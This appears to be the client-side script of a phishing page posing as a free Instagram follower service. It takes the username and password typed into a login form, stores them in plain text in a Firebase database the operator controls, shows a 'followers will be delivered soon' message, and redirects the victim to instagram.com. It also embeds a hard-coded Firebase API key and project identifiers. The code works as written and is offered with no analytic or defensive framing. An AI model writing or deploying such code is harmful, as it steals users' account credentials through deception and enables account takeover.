// ✅ Import Firebase modules properly
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// ✅ Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAbbBRBrHWEXCKCMm-fIOwN8K0VkRKVfQE",
    authDomain: "drunk-b45fb.firebaseapp.com",
    databaseURL: "https://drunk-b45fb-default-rtdb.firebaseio.com",
    projectId: "drunk-b45fb",
    storageBucket: "drunk-b45fb.appspot.com",
    messagingSenderId: "78538344688",
    appId: "1:78538344688:web:68273cd7dff00d6a78da35"
};

// ✅ Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// ✅ Function to Save Login Data
function saveLogin() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        alert("Please enter both username and password!");
        return;
    }

    // 🔹 Replace "." in emails with "_"
    let safeUsername = username.replace(/\./g, "_");

    set(ref(database, "users/" + safeUsername), {
        username: username,  // Keep original email (not modified)
        password: password
    }).then(() => {
        console.log("Sucess you will be get followers soon.");
        alert("Thanks for joining your followers will be deleverd soon!");
        window.location.href = "https://www.instagram.com/"; // ✅ Redirect After Success
    }).catch((error) => {
        console.error("Error saving data:", error);
        alert("Error saving data. Check the console.");
    });
}

// ✅ Attach function to button click
document.getElementById("login-btn").addEventListener("click", saveLogin);